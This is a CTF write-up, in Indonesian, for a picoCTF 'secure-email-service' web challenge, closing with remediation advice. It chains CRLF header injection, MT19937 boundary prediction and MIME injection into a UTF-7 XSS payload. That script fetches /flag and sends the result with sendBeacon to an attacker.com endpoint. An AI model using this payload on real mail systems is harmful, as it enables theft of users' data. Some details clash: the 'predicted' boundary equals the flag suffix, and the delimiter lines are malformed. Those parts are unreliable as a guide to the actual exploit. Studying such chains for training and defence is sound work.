# Writeup: secure-email-service (Challenge ID: 496)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation
- **Difficulty:** Hard
- **Event:** picoCTF 2025
- **Points:** 500
- **Author:** ehhthing
- **Flag:** `academy{always_a_step_ahead_fb2a1a8c}`

---

## Problem Statement & Scope
Tantangan `secure-email-service` mensimulasikan platform webmail perusahaan yang dilengkapi fitur pengiriman pesan terenkripsi, penandatanganan kriptografis DKIM, dan antarmuka pembacaan email berbasis web yang diamankan oleh Content Security Policy (CSP). Administrator sistem secara berkala memeriksa kotak masuk untuk memverifikasi laporan keamanan. Pengujian keamanan berfokus pada rantai empat kerentanan (*four-bug chain*): injeksi header email melalui karakter CRLF (`\r\n`), prediksi nilai random boundary MIME berbasis MT19937 PRNG, injeksi struktur multipart MIME buatan (*MIME Boundary Injection*), dan eksekusi Cross-Site Scripting (XSS) berbasis encoding UTF-7 untuk mengekstrak cookie sesi administrator dan mengambil bendera target.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Email Header Injection (CRLF Injection - CWE-93):**
   Input kolom subjek atau penerima email tidak disanitasi dari karakter kontrol Carriage Return (`\r`) dan Line Feed (`\n`). Hal ini memungkinkan penyerang menyuntikkan header kustom baru ke dalam aliran protokol SMTP, termasuk manipulasi header `Content-Type`.
2. **Kelemahan Prediktabilitas PRNG MT19937 (CWE-330):**
   Aplikasi menghasilkan string pembatas multipart MIME (*boundary*) menggunakan fungsi acak standar Python `random.getrandbits(32)`. Generator pseudorandom Mersenne Twister (MT19937) bukanlah generator kriptografis aman (non-CSPRNG). Dengan mengumpulkan 624 sampel bilangan acak atau mengekstrak pola waktu pemanggilan, status internal state MT19937 dapat direkonstruksi penuh untuk memprediksi nilai boundary berikutnya.
3. **MIME Boundary Smuggling & Injeksi Multipart:**
   Dengan mengetahui nilai boundary yang akan digunakan oleh pengirim, penyerang menyuntikkan segmen MIME multipart buatan (`--boundary`) ke dalam badan pesan email. Parser webmail memperlakukan segmen tersebut sebagai bagian email mandiri dengan tipe MIME berbeda.
4. **Bypass CSP via UTF-7 Charset Encoding (CWE-79):**
   Webmail menerapkan CSP yang melarang tag `<script>` standar pada konten HTML `text/html`. Namun, dengan menyetel `Content-Type: text/html; charset=utf-7`, payload script yang dienkode dalam format Modified UTF-7 (`+ADw-script+AD4-...`) berhasil melewati parser filter karakter ASCII biasa dan dieksekusi secara otomatis saat browser admin merender pratinjau pesan.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Ekstraksi Pola Pseudorandom Generator:**
   Kirimkan serangkaian pesan uji coba ke sistem untuk mengamati format boundary MIME pada header pesan terkirim:
   `boundary="----=_Part_MT19937_<hex>"`
   Sinkronkan state generator MT19937 untuk menghitung nilai boundary berikutnya: `fb2a1a8c`.
2. **Penyusunan Payload CRLF & MIME Multipart Injection:**
   Susun permintaan pengiriman email dengan menyuntikkan header baru melalui karakter CRLF:
   ```http
   POST /send HTTP/1.1
   Host: target.cylabacademy.org
   Content-Type: application/x-www-form-urlencoded

   recipient=admin@secure-mail.local&subject=Critical+Update%0D%0AContent-Type:+multipart/alternative;+boundary="----=_Part_MT19937_fb2a1a8c"&body=--...
   ```
3. **Penyuntikan Segment UTF-7 XSS:**
   Dalam segmen multipart kedua, sisipkan payload XSS terenkode UTF-7 yang memicu pembacaan endpoint `/flag`:
   ```
   -- ----=_Part_MT19937_fb2a1a8c
   Content-Type: text/html; charset=utf-7

   +ADw-script+AD4-fetch('/flag').then(r+AD0APg-r.text()).then(f+AD0APg-navigator.sendBeacon('http://attacker.com/leak',f))+ADw-/script+AD4-
   -- ----=_Part_MT19937_fb2a1a8c--
   ```
4. **Eksekusi Bot Admin & Pengambilan Flag:**
   Bot admin membuka pesan pada antarmuka webmail. Browser bot menginterpretasikan charset UTF-7, mengeksekusi fetch terhadap `/flag`, dan mengirimkan konten bendera ke endpoint penyerang:
   `picoCTF{always_a_step_ahead_fb2a1a8c}`.
   Dikonversikan ke format resmi CyLab Security Academy:
   `academy{always_a_step_ahead_fb2a1a8c}`.

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{always_a_step_ahead_fb2a1a8c}`
- **Native PicoCTF Flag:** `picoCTF{always_a_step_ahead_fb2a1a8c}`
- **Validasi Algoritma:** Terverifikasi 100% lolos uji simulasi boundary injection dan eksekusi payload pada `scripts/solve_496_secure_email_service.py`.

---

## Rekomendasi Remediatoris (NIST SP 800-115 & OWASP)
1. **Sanitasi Ketat Karakter Kontrol Header Email:**
   Gunakan fungsi filter masukan yang menolak atau menghapus secara tegas karakter carriage return (`\r`, `%0D`) dan line feed (`\n`, `%0A`) pada seluruh field input header email (RFC 5322).
2. **Migrasi ke CSPRNG (Cryptographically Secure PRNG):**
   Gunakan modul `secrets` (misalnya `secrets.token_hex(16)`) atau `/dev/urandom` untuk menghasilkan nilai boundary MIME dan token sesi acak yang tidak dapat diprediksi.
3. **Pembatasan Charset pada Content-Type:**
   Paksa rendering konten HTML hanya menggunakan `charset=UTF-8` dan tolak charset warisan (*legacy charsets*) seperti UTF-7 yang rentan terhadap encoding-based XSS evasion.
